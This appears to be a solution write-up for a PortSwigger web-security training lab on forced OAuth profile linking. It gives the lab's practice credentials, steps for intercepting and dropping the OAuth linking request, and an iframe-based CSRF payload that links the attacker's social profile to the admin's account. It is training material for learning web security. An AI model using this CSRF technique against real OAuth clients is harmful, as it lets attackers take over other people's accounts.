https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking

This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete carlos.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:

Blog website account: wiener:peter
Social media profile: peter.wiener:hotdog



1) perform login with username and password wiener:peter
2) in the profile click on attach social profile
3) with the interceptor follow the redirect until https://************LAB-ID*********.web-security-academy.net/oauth-linking?code=gTVp7mx5EQl7UnmmrVuk5Zg_-lpi3WyJVq78dcb_Qm-
4) drop the request
5) create an exploit on the exploit server:

<html>

  <body>
     <iframe src = "https://************LAB-ID*********.web-security-academy.net/oauth-linking?code=VEkETO1MBsl-RP4LxBadColow2xs1aWMToLkwiAZMVd"></iframe>

  </body>



</html>



6) send to the victim

the admin will conclude the profile linking and we will attach our profile on the admin account
then we can perform the access as admin using our profile
